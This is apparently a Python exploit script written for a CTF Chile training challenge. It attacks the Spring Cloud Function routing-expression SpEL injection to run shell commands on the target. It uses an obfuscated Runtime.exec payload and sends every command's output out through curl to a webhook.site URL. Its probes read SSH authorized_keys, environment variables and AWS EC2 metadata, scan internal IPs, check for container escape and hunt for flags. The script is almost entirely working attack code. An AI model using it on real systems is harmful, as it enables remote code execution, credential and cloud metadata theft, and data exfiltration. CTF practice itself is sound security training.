#!/usr/bin/env python3
"""
CTF Chile - Ataque final: explorar todos los vectores restantes
"""
import requests
import time
import base64

TARGET = "http://training-pod2.ctfchile.com:32778"
ROUTER = TARGET + "/functionRouter"

# Crear webhook
print("[*] Creando webhook...")
UUID = requests.post("https://webhook.site/token", timeout=10).json()["uuid"]
WH = "https://webhook.site/" + UUID
print(f"    URL: {WH}")

def build_payload(shell_cmd):
    esc = shell_cmd.replace("\\", "\\\\").replace('"', '\\"')
    return (
        'T(java.lang.Class).forName("java.lang.Runt"+"ime")'
        '.getMethod("exe"+"c",new String[]{}.getClass())'
        '.invoke('
        'T(java.lang.Class).forName("java.lang.Runt"+"ime")'
        '.getMethod("getRunt"+"ime").invoke(null),'
        'new String[]{"/bin/sh","-c","' + esc + '"}'
        ').waitFor()'
    )

def probe(tag, cmd):
    shell = f"{cmd} | base64 -w0 | xargs -I X curl -s '{WH}/{tag}?d=X'"
    p = build_payload(shell)
    try:
        r = requests.post(ROUTER, headers={
            "spring.cloud.function.routing-expression": p,
            "Content-Type": "text/plain",
        }, data="x", timeout=15)
        print(f"    [+] {tag:25} http {r.status_code}")
    except Exception as e:
        print(f"    [!] {tag} error: {e}")

print("[*] Buscar flags ocultos en todo el sistema...")

# Búsqueda exhaustiva de flags con diferentes patrones
probe("flag_exhaustive1", "find / -type f 2>/dev/null | xargs strings 2>/dev/null | grep -i 'ctfchile{' | head -5")
probe("flag_exhaustive2", "find / -type f 2>/dev/null | xargs grep -l 'flag' 2>/dev/null | head -10")

print("[*] Explorar AWS/EC2 metadata...")

# En AWS EC2, a veces hay metadata accesible
probe("aws_metadata", "timeout 3 curl -s http://169.254.169.254/latest/meta-data/")
probe("aws_userdata", "timeout 3 curl -s http://169.254.169.254/latest/user-data/")

print("[*] Buscar configuración SSH avanzada...")

# Buscar configuración SSH específica
probe("ssh_config_detail", "find / -name '*ssh*' -type f 2>/dev/null | head -15")
probe("authorized_keys", "find / -name 'authorized_keys' 2>/dev/null | xargs cat")

print("[*] Intentar exploits de escape de contenedor...")

# Verificar si podemos escapar del contenedor
probe("proc_version", "cat /proc/version")
probe("privileged_check", "cat /proc/self/status | grep Cap")

print("[*] Buscar procesos ocultos o servicios internos...")

# Ver si hay procesos que se ejecutan en background
probe("all_processes", "ps auxf")
probe("listening_ports", "netstat -tulpn 2>/dev/null | grep LISTEN")

print("[*] Explorar archivos de base64 o codificados...")

# Buscar archivos que puedan estar codificados
probe("base64_files", "find /app /root /tmp -name '*.b64' -o -name '*.enc' -o -name '*.encoded' 2>/dev/null | head -5")
probe("suspicious_files", "find /app /root /tmp -type f -size +100c -size -1000c 2>/dev/null | head -10")

print("[*] Buscar variables de entorno de aplicaciones...")

# Revisar variables específicas de la aplicación
probe("spring_profiles", "env | grep -i spring")
probe("app_config", "env | grep -i config")

print("[*] Intentar acceso directo por IP usando curl...")

# Probar acceso HTTP directo sin autenticación
for ip in ["10.160.209.1", "10.109.220.1", "10.109.220.254"]:
    ip_clean = ip.replace(".", "_")
    probe(f"direct_http_{ip_clean}", f"timeout 5 curl -s http://{ip}/ | head -10 2>/dev/null || echo 'HTTP_FAILED_{ip}'")

print("[*] Buscar archivos de configuración específicos del CTF...")

# Archivos típicos de CTF
probe("ctf_files", "find / -name '*ctf*' -o -name '*flag*' -o -name '*hint*' 2>/dev/null | head -10")
probe("readme_files", "find / -name 'README*' -o -name 'HINT*' -o -name 'FLAG*' 2>/dev/null | xargs cat 2>/dev/null")

time.sleep(20)

# Recoger respuestas
print("[*] Recogiendo respuestas...")
r = requests.get(f"https://webhook.site/token/{UUID}/requests?sorting=newest&per_page=40", timeout=10)
data = r.json().get("data", [])

flags_found = []
interesting_info = []

for req in data:
    url = req.get("url", "")
    path = url.split(f"webhook.site/{UUID}/")[-1].split("?")[0]
    q = req.get("query") or {}
    raw = q.get("d")
    if isinstance(raw, list):
        raw = raw[0] if raw else ""

    print("=" * 60)
    print("TAG:", path)
    if raw:
        try:
            decoded = base64.b64decode(raw).decode("utf-8", "replace")
            print(decoded)

            # Buscar flags CTF
            if "ctfchile{" in decoded.lower():
                flags_found.append(decoded)
                print("\n🚩🚩🚩 FLAG ENCONTRADO! 🚩🚩🚩")
                print(f"CONTENIDO: {decoded}")

            # Buscar información interesante
            if any(keyword in decoded.lower() for keyword in ["ssh-", "password", "key", "secret", "ec2", "aws"]):
                interesting_info.append((path, decoded))
                print("🔍 Información potencialmente útil")

        except Exception as e:
            print(f"(decode error) {raw[:200]}")
    else:
        print("(sin payload)")

print(f"\n[*] Manual review: https://webhook.site/#!/{UUID}")

if flags_found:
    print(f"\n🎉🎉🎉 TOTAL FLAGS ENCONTRADOS: {len(flags_found)} 🎉🎉🎉")
    for i, flag in enumerate(flags_found, 1):
        print(f"  FLAG {i}: {flag.strip()}")
else:
    print("\n[*] No se encontraron flags en esta búsqueda exhaustiva")

if interesting_info:
    print(f"\n🔍 INFORMACIÓN INTERESANTE ENCONTRADA: {len(interesting_info)} elementos")